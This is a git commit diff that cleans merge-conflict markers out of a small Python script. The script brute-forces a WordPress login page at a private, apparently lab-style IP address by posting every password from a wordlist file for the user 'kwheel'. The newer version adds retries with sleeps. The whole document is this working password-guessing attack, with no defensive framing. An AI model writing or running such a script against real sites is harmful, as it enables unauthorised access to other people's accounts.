2dcb6dab9e101b0c48f62ab10890154ec3c22741
Tim Bowman <tim@timbowman.com.au>
2022-12-14 08:57:07 +1000

    fixes

--- main.py
+++ main.py
@@ -1,38 +1,27 @@
-<<<<<<< HEAD
-import sys,requests
-=======
+
 import sys,requests,time
->>>>>>> aad859c (fix)
+
 
 url = "http://10.10.14.90/wp-login.php"
 file_path = "test.txt"
 file_len = len(open(file_path, "r").readlines())
 lines = []
-<<<<<<< HEAD
-with open(file_path, "r", errors='replace') as f:
-	for x in range(file_len):
-		lines.append(f.readline().strip('\n'))
 
-data = {
-"log": "khweel",
-"pwd": "test"
-}
 
-=======
 with open(file_path, "r", errors='replace', encoding='UTF-8') as f:
 	for x in range(file_len):
 		lines.append(f.readline().strip('\n'))
 
->>>>>>> aad859c (fix)
+
 for line in lines:
     data = {
     "log":"kwheel",
     "pwd": line
     }
-<<<<<<< HEAD
+
     request = requests.post(url, data)
     print(request)
-=======
+
     try:
         request = requests.post(url, data)
         if request.status_code == 200:
@@ -43,7 +32,6 @@ for line in lines:
     except:
         time.sleep(5)
 
->>>>>>> aad859c (fix)
 
 
 #try:
